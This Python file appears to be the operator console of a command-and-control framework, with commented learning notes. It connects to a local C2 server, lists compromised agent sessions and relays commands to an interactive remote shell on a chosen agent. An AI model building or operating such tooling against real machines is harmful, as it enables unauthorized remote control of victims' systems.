import socket
import cli
import struct
import protocol
import console
import colors


TARGET_PORT = 9000
TARGET_IP = "127.0.0.1"
HOST = "0.0.0.0"


# [count]              4 bytes

# for every session:
#     [session_id]     4 bytes
#     [ip_length]       4 bytes
#     [ip_address]      variable
#     [port]            2 bytes

def receive_exact(operator_socket, length): # function to receive the data in chunks 
    data = b""
    while len(data) < length:
        chunk = operator_socket.recv(length - len(data))
        if not chunk:
            raise ConnectionError(f"{colors.Fore.RED} [!] c2 server closed connection")
        data += chunk
    return data


def receive_packet(operator_socket):
    header_bytes = receive_exact(operator_socket, 12)
    message_type, session_id, payload_length = struct.unpack("!III", header_bytes)
    payload = ""
    if payload_length > 0:
        payload_bytes = receive_exact(operator_socket, payload_length)
        payload = payload_bytes.decode(errors="replace")
    return message_type, session_id, payload



def receive_sessions(operator_socket): # deserialize sessionInfo bytes and display total sessions and session ids
    session_count_bytes = receive_exact(operator_socket, 4) # receive total number of sessions present
    sessionCount = struct.unpack("!I", session_count_bytes)[0] # !I is used to unpack network bytes (Big endian) data into Python integer
    # struct.unpack() returns a tuple, so [0] is used to get only one value
    session_info = [] # list of dictionaries
    for _ in range(sessionCount):
        # receive agent session_id
        agent_session_id_bytes = receive_exact(operator_socket, 4) 
        agent_session_id = struct.unpack("!I", agent_session_id_bytes)[0]

        # receive agent ip address length
        agent_ip_len_bytes = receive_exact(operator_socket, 4)
        agent_ip_len = struct.unpack("!I", agent_ip_len_bytes)[0] #!I or !H tells python how to interpret those bytes like !I = unsigned 4 byte integer or uint32_t

        # receive agent ip address
        agent_ip_bytes = receive_exact(operator_socket, agent_ip_len)
        agent_ip = agent_ip_bytes.decode() # since ip address is a strin object

        #receive agent port
        agent_port_bytes = receive_exact(operator_socket, 2)
        agent_port = struct.unpack("!H", agent_port_bytes)[0]# since reading 2 bytes so !H = unsigned short = 2 bytes

        session_info.append({
            "agent_sid": agent_session_id,
            "agent_ip": agent_ip,
            "agent_port": agent_port,
        })
    #session_info.sort() we cannot directly use .sort() because python doesn't know to sort dictionary values.
    # because sorting needs to happen based on a comparison so we need to use a different method
    session_info = sorted(session_info, key=lambda a : a["agent_sid"]) # sorting the session_info list containing dictionary values based on session_id
    return session_info, sessionCount



def start_shell(session_id): # here session_id is the current_session variable from dispatcher.py 
    shell_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        shell_socket.connect((TARGET_IP, TARGET_PORT))
        print(f"{colors.Style.BRIGHT}{colors.Fore.CYAN}[*] Starting interactive shell for session {session_id}{colors.Style.RESET_ALL}")
        packet_bytes = protocol.packet_formation(protocol.MESSAGE_SHELL_START, session_id, "")
        shell_socket.sendall(packet_bytes)
        print(f"{colors.Fore.CYAN}[+] Shell start request sent{colors.Style.RESET_ALL}")
        print(f"{colors.Fore.CYAN}[*] Waiting for shell output...{colors.Style.RESET_ALL}")

        msg_type, sid, payload = receive_packet(shell_socket)
        if msg_type == protocol.MESSAGE_ERROR:
            print(f"{colors.Fore.RED}[!] Shell connection failed: {payload}{colors.Style.RESET_ALL}")
            return
        elif msg_type == protocol.MESSAGE_SHELL_ACK:
            print(f"{colors.Style.BRIGHT}{colors.Fore.GREEN}[+] Shell connected{colors.Style.RESET_ALL}")
            print()
        else:
            print(f"{colors.Fore.YELLOW}[!] Unexpected message received: {msg_type}{colors.Style.RESET_ALL}")
            return

        while True:
            try:
                command = cli.shellPrompt()
            except EOFError:
                command = "back"
            if not command.strip():
                continue
            if command.strip() in ("back", "exit"):
                exit_packet = protocol.packet_formation(protocol.MESSAGE_SHELL_EXIT, session_id, "")
                shell_socket.sendall(exit_packet)
                msg_type, sid, payload = receive_packet(shell_socket)
                if payload:
                    print(f"\n{colors.Style.BRIGHT}{colors.Fore.GREEN}{payload}{colors.Style.RESET_ALL}")
                else:
                    print(f"\n{colors.Style.BRIGHT}{colors.Fore.GREEN}[+] Shell closed{colors.Style.RESET_ALL}")
                break

            data_packet = protocol.packet_formation(protocol.MESSAGE_SHELL_DATA, session_id, command)
            shell_socket.sendall(data_packet)

            msg_type, sid, payload = receive_packet(shell_socket)
            if msg_type == protocol.MESSAGE_ERROR:
                print(f"{colors.Fore.RED}[!] Error: {payload}{colors.Style.RESET_ALL}")
            else:
                print(payload)

    except (OSError, ConnectionError) as e:
        print(f"{colors.Fore.RED}[!] shell connection closed: {e}{colors.Style.RESET_ALL}")
    finally:
        shell_socket.close()



def sessions(command):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as operator_socket:
        try:
            operator_socket.connect((TARGET_IP, TARGET_PORT))
            #print(f"[+] operator connected to server successfully")
            while True:
                if command == "sessions":
                    packet_bytes = protocol.packet_formation(protocol.MESSAGE_COMMAND, 0, command) # 0 because we are just typing "sessions" command and not choosing any active session so...
                    operator_socket.sendall(packet_bytes)
                    session_info, sessionCount = receive_sessions(operator_socket) # passing operator socket and 4 bytes cuz number of session ids are 4 bytes
                    console.display_sessionInfo(session_info, sessionCount)
                    return session_info
        except OSError as e:
            print(f"{colors.Fore.RED}[!] couldn't connect to server\n")
            operator_socket.close()